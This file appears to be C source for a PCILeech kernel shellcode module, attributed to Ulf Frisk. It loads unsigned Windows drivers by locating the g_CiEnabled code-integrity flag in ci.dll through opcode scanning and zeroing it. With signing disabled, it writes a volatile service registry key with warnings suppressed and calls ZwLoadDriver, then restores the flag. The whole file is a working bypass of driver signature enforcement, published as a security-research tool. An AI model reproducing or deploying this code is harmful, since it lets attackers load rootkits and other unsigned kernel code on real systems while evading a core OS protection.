// wx64_driverload_svc.c : kernel code to load both unsigned and signed drivers.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_driverload_svc.c
// ml64 wx64_common_a.asm /Fewx64_driverload_svc.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_driverload_svc.obj wx64_common.obj
// shellcode64 -o wx64_driverload_svc.exe "KERNEL MODULE LOADER - LOAD UNSIGNED DRIVERS BY SERVICE NAME!        \n=====================================================================\nLoads unsigned or signed drivers by registry service or filename.    \nNOTE! If a filename is specified a registry service will be created  \nfor the filename prior to loading the driver. The OS may pop up a    \nbox telling the logged on user about not being able to load an       \nunsigned driver. The registry service key will disappear on reboot.  \nREQUIRED OPTIONS:                                                    \n  -s : service or file name.                                         \n       Example:                                                      \n       "\Registry\Machine\System\CurrentControlSet\Services\mydriver"\n	   "\??\c:\Temp\mydriver.sys"                                    \n===== DRIVER LOAD STATUS (RESULT) ===================================\nSERVICE ENTRY : %s\nLOAD NTSTATUS : 0x%08X                                               \n=====================================================================\n"
//  
#include "wx64_common.h"

//----------------------------------------------------------------------------------------------------------

#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define OBJ_KERNEL_HANDLE       				0x00000200

typedef struct tdKERNEL_FUNCTIONS2 {
	wchar_t*(*wcscat)(
		wchar_t *strDestination,
		const wchar_t *strSource
		);
	NTSTATUS(*ZwCreateKey)(
		_Out_      PHANDLE            KeyHandle,
		_In_       ACCESS_MASK        DesiredAccess,
		_In_       POBJECT_ATTRIBUTES ObjectAttributes,
		_Reserved_ ULONG              TitleIndex,
		_In_opt_   PUNICODE_STRING    Class,
		_In_       ULONG              CreateOptions,
		_Out_opt_  PULONG             Disposition
		);
	NTSTATUS(*ZwLoadDriver)(
		_In_ PUNICODE_STRING DriverServiceName
		);
	NTSTATUS(*ZwSetValueKey)(
		_In_     HANDLE          KeyHandle,
		_In_     PUNICODE_STRING ValueName,
		_In_opt_ ULONG           TitleIndex,
		_In_     ULONG           Type,
		_In_opt_ PVOID           Data,
		_In_     ULONG           DataSize
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->wcscat,							H_wcscat },
		{ &fnk2->ZwCreateKey,						H_ZwCreateKey },
		{ &fnk2->ZwLoadDriver,						H_ZwLoadDriver },
		{ &fnk2->ZwSetValueKey,						H_ZwSetValueKey },
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

/*
* Check if the file exists - if so return a PUNICODE_STRING containing the file name.
* NB! the pusImagePath parameter must be free'd by RtlFreeUnicodeString by caller upon success.
*/
NTSTATUS DriverRegGetImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ PUNICODE_STRING pusImagePath)
{
	NTSTATUS nt;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNREFERENCED_PARAMETER(fnk2);
	// check if file exists
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(pusImagePath, &_sa, TRUE);
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&_oa, pusImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(hFile) {
		fnk->ZwClose(hFile);
	}
	if(NT_ERROR(nt)) {
		fnk->RtlFreeUnicodeString(pusImagePath);
		return nt;
	}
	return ERROR_SUCCESS;
}

/*
* Get the Name (data after last \) given a null terminated string.
*/
LPWSTR DriverRegGetImageNameFromPath(LPWSTR wszSrc)
{
	DWORD i = 0, j = 0;
	while(wszSrc[i] != 0) {
		if(wszSrc[i] == '\\') {
			j = i + 1;
		}
		i++;
	}
	return &wszSrc[j];
}

/*
* Set required values into a service registry key
*/
VOID DriverRegSetServiceKeys(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE hKeyHandle, _In_ PUNICODE_STRING pusImagePath)
{
	WCHAR WSZ_ErrorControl[] = { 'E', 'r', 'r', 'o', 'r', 'C', 'o', 'n', 't', 'r', 'o', 'l', 0 };
	WCHAR WSZ_ImagePath[] = { 'I', 'm', 'a', 'g', 'e', 'P', 'a', 't', 'h', 0 };
	WCHAR WSZ_Start[] = { 'S', 't', 'a', 'r', 't', 0 };
	WCHAR WSZ_Type[] = { 'T', 'y', 'p', 'e', 0 };
	DWORD dwValue0 = 0, dwValue1 = 1, dwValue3 = 3;
	UNICODE_STRING usErrorControl, usImagePath, usStart, usType;
	UNREFERENCED_PARAMETER(pk);
	UNREFERENCED_PARAMETER(fnk2);
	fnk->RtlInitUnicodeString(&usErrorControl, WSZ_ErrorControl);
	fnk->RtlInitUnicodeString(&usImagePath, WSZ_ImagePath);
	fnk->RtlInitUnicodeString(&usStart, WSZ_Start);
	fnk->RtlInitUnicodeString(&usType, WSZ_Type);
	fnk2->ZwSetValueKey(hKeyHandle, &usStart, 0, REG_DWORD, (PVOID)&dwValue3, sizeof(DWORD)); // 3 = Load on Demand
	fnk2->ZwSetValueKey(hKeyHandle, &usType, 0, REG_DWORD, (PVOID)&dwValue1, sizeof(DWORD)); // 1 = Kernel Device Driver
	fnk2->ZwSetValueKey(hKeyHandle, &usErrorControl, 0, REG_DWORD, (PVOID)&dwValue0, sizeof(DWORD)); // 0 = Do not show warning
	fnk2->ZwSetValueKey(hKeyHandle, &usImagePath, 0, REG_SZ, pusImagePath->Buffer, pusImagePath->Length + 2);
}

/*
* Try create a registry service that may be used by ZwLoadDriver to load a driver.
*/
NTSTATUS DriverRegCreateService(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _Out_ WCHAR wszServicePath[MAX_PATH])
{
	NTSTATUS nt;
	WCHAR WSZ_ServicePathBase[] = { '\\', 'R', 'e', 'g', 'i', 's', 't', 'r', 'y', '\\',  'M', 'a', 'c', 'h', 'i', 'n', 'e', '\\', 'S', 'y', 's', 't', 'e', 'm', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 't', '\\', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '\\', 0 };
	UNICODE_STRING usRegPath, usImagePath;
	OBJECT_ATTRIBUTES _oaReg;
	LPWSTR wszImageName;
	HANDLE hKeyHandle;
	// fetch image name and path
	nt = DriverRegGetImagePath(pk, fnk, fnk2, &usImagePath);
	if(NT_ERROR(nt)) {
		return nt;
	}
	wszImageName = DriverRegGetImageNameFromPath(usImagePath.Buffer);
	fnk->RtlCopyMemory(wszServicePath, WSZ_ServicePathBase, sizeof(WSZ_ServicePathBase) + 2);
	fnk2->wcscat(wszServicePath, wszImageName);
	fnk->RtlInitUnicodeString(&usRegPath, wszServicePath);
	// create the reg key
	InitializeObjectAttributes(&_oaReg, &usRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk2->ZwCreateKey(&hKeyHandle, KEY_ALL_ACCESS, &_oaReg, 0, NULL, REG_OPTION_VOLATILE, NULL);
	if(NT_SUCCESS(nt)) {
		DriverRegSetServiceKeys(pk, fnk, fnk2, hKeyHandle, &usImagePath);
	}
	fnk->RtlFreeUnicodeString(&usImagePath);
	fnk->ZwClose(hKeyHandle);
	return nt;
}

/*
* Retrieve the address of the code integrity flag
* see: https://github.com/hfiref0x/DSEFix/blob/master/Source/ci-hunter
*/
QWORD GetAddr_g_CiEnabled(QWORD qwAddrModuleCi)
{
	QWORD qwA;
	DWORD i = 0, j = 0;
	qwA = PEGetProcAddressH(qwAddrModuleCi, H_CiInitialize);
	if(!qwA) {
		return 0;
	}
	do {
		// JMP to CiInitialize sub function
		// TODO: add proper dasm instead of trivial opcode-scanning
		if(*(PBYTE)(qwA + i) == 0xE9) {
			qwA = qwA + i + 5 + *(PLONG)(qwA + i + 1);
			do {
				// Scan for MOV to g_CiEnabled
				if(*(PUSHORT)(qwA + j) == 0x0D89) {
					return qwA + j + 6 + *(PLONG)(qwA + j + 2);
				}
				j++;
			} while(j < 256);
			return 0;
		}
		i++;
	} while(i < 128);
	return 0;
}

/*
* Load a driver by service name.
*/
NTSTATUS DriverLoadByServiceName(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	ANSI_STRING saServicePath;
	UNICODE_STRING usServicePath;
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, MAX_PATH);
	fnk->RtlInitAnsiString(&saServicePath, pk->dataInStr);
	fnk->RtlAnsiStringToUnicodeString(&usServicePath, &saServicePath, TRUE);
	nt = fnk2->ZwLoadDriver(&usServicePath);
	fnk->RtlFreeUnicodeString(&usServicePath);
	return nt;
}

/*
* Load a driver by image path by creating a mock service, load the driver and then deleting the mock service.
*/
NTSTATUS DriverLoadByImagePath(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	WCHAR wszServicePath[MAX_PATH];
	UNICODE_STRING usServicePath;
	DWORD i;
	nt = DriverRegCreateService(pk, fnk, fnk2, wszServicePath);
	if(NT_ERROR(nt)) {
		return nt;
	}
	for(i = 0; i < MAX_PATH; i++) {
		pk->dataOutStr[i] = (CHAR)wszServicePath[i];
	}
	fnk->RtlInitUnicodeString(&usServicePath, wszServicePath);
	return fnk2->ZwLoadDriver(&usServicePath);
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	CHAR C_CI[] = { 'c', 'i', '.', 'd', 'l', 'l', 0 };
	KERNEL_FUNCTIONS ofnk;
	KERNEL_FUNCTIONS2 ofnk2;
	LPSTR s = pk->dataInStr;
	QWORD qwAddrModuleCI;
	PQWORD pqwModuleCI_g_PG = NULL;
	QWORD qwModuleCI_g_PG_Orig = 0;
	if(s[0] != '\\') {
		pk->dataOut[0] = ERROR_INVALID_PARAMETER;
		return;
	}
	// initialize kernel functions
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &ofnk2);
	// disable code signing
	qwAddrModuleCI = KernelGetModuleBase(&ofnk, C_CI);
	if(!qwAddrModuleCI) {
		pk->dataOut[0] = ERROR_MISSING_SYSTEMFILE;
		return;
	}
	pqwModuleCI_g_PG = (PQWORD)GetAddr_g_CiEnabled(qwAddrModuleCI);
	qwModuleCI_g_PG_Orig = *pqwModuleCI_g_PG;
	*pqwModuleCI_g_PG = 0;
	if((s[1] == 'r' || s[1] == 'R') && (s[2] == 'e' || s[2] == 'E') && (s[3] == 'g' || s[3] == 'G')) {
		// load from registry path
		pk->dataOut[0] = DriverLoadByServiceName(pk, &ofnk, &ofnk2);
	}
	else {
		// load from image path
		pk->dataOut[0] = DriverLoadByImagePath(pk, &ofnk, &ofnk2);
	}
	// restore code signing to original state
	*pqwModuleCI_g_PG = qwModuleCI_g_PG_Orig;
}